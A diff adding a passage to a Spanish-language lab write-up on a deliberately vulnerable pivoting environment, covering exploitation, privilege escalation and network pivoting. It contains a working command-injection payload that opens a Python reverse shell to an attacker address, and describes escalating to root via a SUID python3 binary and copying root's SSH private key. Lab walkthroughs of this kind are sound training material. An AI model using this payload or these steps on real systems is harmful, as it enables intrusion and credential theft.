@@ -61,3 +61,58 @@ Analizando el código del exploit **EDB-ID: 51717** , encontramos que pone **123
 Reenviamos el puerto 4041 de *Jerry-PC* al 4040 de *Attacker*, dónde levantaremos un escucha de netcat.
 
 ![[EXCALIDRAW/DiagramaRed - 02.excalidraw]]
+
+Modificamos el payload para que se vea así:
+
+```
+1234567890 & python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.11.2",4041));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
+```
+
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_15.png)
+
+Y conseguimos acceso al webserver.
+
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_16.png)
+
+Y observamos que el webserver tiene 3 interfaces de red.
+
+![[EXCALIDRAW/DiagramaRed - 03.excalidraw]]
+
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_17.png)
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_18.png)
+
+Levantamos un servidor con python3 en *jerry-pc* para transferir nuestras herramientas al *webserver*.
+
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_19.png)
+
+Vemos que el binario de python3 tiene el SUID activado.
+
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_20.png)
+
+Usando las utilidades de **GTFObin** conseguimos escalar a root.
+
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_21.png)
+
+Vemos que en el directorio personal de root hay una carpeta .ssh con un par de claves publico-privadas.
+
+Copiamos la clave privada a la máquina atacante.
+
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_22.png)
+
+Vemos los hosts de cada subred detectada.
+
+![[EXCALIDRAW/DiagramaRed - 04.excalidraw]]
+
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_23.png)
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_24.png)
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_25.png)
+
+Levantamos otra conexión entre *jerry-pc* y *webserver*, y añadimos una nueva línea a la configuración de proxychains.
+
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_26.png)
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_27.png)
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_28.png)
+![](IMAGES/Damn%20Vulnerable%20Pivoting%20Enviroment%20-%20IMG_29.png)
+
+Escaneamos todos los hosts para identificar sus puertos abiertos.
+
